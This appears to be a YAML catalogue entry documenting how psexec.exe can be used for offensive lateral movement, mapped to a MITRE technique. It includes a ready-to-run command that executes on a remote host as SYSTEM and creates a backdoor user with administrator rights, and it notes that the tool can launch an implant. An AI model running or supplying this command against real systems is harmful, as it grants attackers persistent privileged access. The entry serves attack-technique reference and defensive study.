---
Name: psexec.exe
Description: Executes a program on a remote system, where remotely executed console applications execute interactively
Updated: 2023-07-01
Toolsets:
  - Sysinternals
Commands:
  - Command: psexec.exe \\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add
    Description: Execute commands
    Usecases:
      - In this example adds a backdoor user
      - Can also be used to launch an implant
    Function: Execute
    Comments:
      - Installs PSEXESVC service on remote system
    MitreAttack:
      - T1569.002
Resources:
Detections:
Contributors:
    - Name: Arris Huijgen
      Handle: bitsadmin
---
